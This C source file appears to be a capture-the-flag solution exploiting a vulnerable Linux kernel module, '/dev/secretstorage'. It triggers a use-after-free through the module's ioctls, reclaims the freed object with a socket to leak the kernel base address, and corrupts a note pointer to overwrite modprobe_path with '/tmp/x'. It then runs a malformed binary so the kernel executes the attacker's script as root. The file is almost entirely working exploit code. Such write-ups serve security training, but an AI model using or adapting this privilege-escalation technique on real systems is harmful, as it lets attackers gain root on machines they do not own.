#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/timerfd.h>
#include <sys/msg.h>
#include <sys/socket.h>

#define DO_CREATE    0xc020ca00
#define DO_READ      0xc020ca01
#define DO_WRITE     0xc020ca02
#define DO_RESIZE    0xc020ca03
#define DO_DELETE    0xc020ca04

// Global variables
int fd = 0; 
uint64_t kernel_base = 0; 
uint64_t modprobe_path = 0; 

// Module stuff
struct req {
    uint64_t idx;
    uint64_t name_addr;
    uint64_t note_size;
    uint64_t note_addr;
};

int create_box(char * name, uint64_t note_size, char * note) {
    struct req req; 
    req.idx = 0; 
    req.name_addr = (uint64_t) name;
    req.note_size = note_size;
    req.note_addr = (uint64_t) note; 
    
    if (ioctl(fd, DO_CREATE, &req) < 0) {
        perror("[!] Create failed");
        return -1;
    }
    //printf("[+] Performed create\n");
    return 0;
}

int read_box(uint64_t idx, char * name, char * note) {
    struct req req; 
    req.idx = idx; 
    req.name_addr = (uint64_t) name;
    req.note_size = 0;
    req.note_addr = (uint64_t) note; 
    
    if (ioctl(fd, DO_READ, &req) < 0) {
        perror("[!] Read failed");
        return -1;
    }
    printf("[+] Performed read\n");
    return 0;
}

int resize_box(uint64_t idx, char * name, uint64_t size, char * note) {
    struct req req; 
    req.idx = idx; 
    req.name_addr = (uint64_t) name;
    req.note_size = size;
    req.note_addr = (uint64_t) note; 
    
    if (ioctl(fd, DO_RESIZE, &req) < 0) {
        perror("[!] Resize failed");
        return -1;
    }
    //printf("[+] Performed resize\n");
    return 0;
}

int write_box(uint64_t idx, char * name, char * note) {
    struct req req; 
    req.idx = idx; 
    req.name_addr = (uint64_t) name;
    req.note_size = 0;
    req.note_addr = (uint64_t) note; 
    
    if (ioctl(fd, DO_WRITE, &req) < 0) {
        perror("[!] Write failed");
        return -1;
    }
    printf("[+] Performed write\n");
    return 0;
}

int delete_box(uint64_t idx) {
    struct req req; 
    req.idx = idx; 
    req.name_addr = 0;
    req.note_size = 0;
    req.note_addr = 0; 
    
    if (ioctl(fd, DO_DELETE, &req) < 0) {
        perror("[!] Delete failed");
        return -1;
    }
    printf("[+] Performed delete\n");
    return 0;
}

// PWNY STUFF
int get_flag(void) {
    system("echo '#!/bin/sh\nhead -n 1 /dev/sda > /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    printf("[+] Run unknown file\n");
    system("/tmp/dummy");

    printf("[+] Read flag\n");
    system("cat /tmp/flag");

    return 0;
}


int main(void) {
    // STAGE 1: SETUP
    printf("STAGE 1: SETUP\n");
    printf("[+] Initial setup\n");
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(0, &cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
        perror("sched_setaffinity");
        exit(-1);
    }
    
    // Open secretstorage device
    printf("[+] Opening SecretStorage device\n");
    if ((fd = open("/dev/secretstorage", O_RDONLY)) < 0) {
        perror("[!] Failed to open miscdevice");
        exit(-1);
    }
    
    // STAGE 2: UAF
    printf("STAGE 2: UAF\n"); 
    char name[0x50]; 
    char note[0x100]; 
    int ret = 0; 
    
    // Create box 0
    printf("[+] Create box 0\n"); 
    memset(name, 0x41, sizeof(name)); 
    memset(note, 0x42, sizeof(note)); 
    create_box(name, 0x100, note); 
    
    // Create box 1
    printf("[+] Create box 1\n"); 
    memset(name, 0x43, sizeof(name)); 
    memset(note, 0x44, sizeof(note));
    create_box(name, 0x100, note); 
    
    // Delete box 0
    delete_box(0);  
    
    // Reclaim box 0
    ret = socket(22, AF_INET, 0); 
    
    memset(name, 0x0, sizeof(name)); 
    memset(note, 0x0, sizeof(note)); 
    read_box(0, name, note);
    
    printf("[+] Printing name:\n");
    for (int i = 0; i < (0x50/8); i++) {
        printf("    %d: 0x%llx\n", i, ((uint64_t *)&name)[i]); 
    }
    /**
    printf("[+] Printing note:\n");
    for (int i = 0; i < (0x50/8); i++) {
        printf("    %d: 0x%llx\n", i, ((uint64_t *)&note)[i]); 
    }**/
    
    kernel_base = ((uint64_t *)&name)[3] - 0xab080;
    printf("[+] Kernel base: 0x%llx\n", kernel_base); 
    
    modprobe_path = kernel_base + 0x1b3f100; 
    printf("[+] modprobe path: 0x%llx\n", modprobe_path); 
    
    // Overwrite box 0
    printf("[+] Overwrite box 0\n"); 
    memset(name, 0x45, sizeof(name)); 
    memset(note, 0x46, 0x50);
    ((uint64_t *)&note)[10] = 0x10;
    ((uint64_t *)&note)[11] = modprobe_path;
    resize_box(1, name, 0x60, note); 
    
    // STAGE 3: MODPROBE_PATH OVERWRITE
    printf("STAGE 3: MODPROBE_PATH OVERWRITE\n");
    char overwrite[0x10]; 
    memset(overwrite, 0, sizeof(overwrite)); 
    strcpy(overwrite, "/tmp/x\x00"); 
    
    write_box(0, name, overwrite); 
    get_flag(); 

    return 0;
}
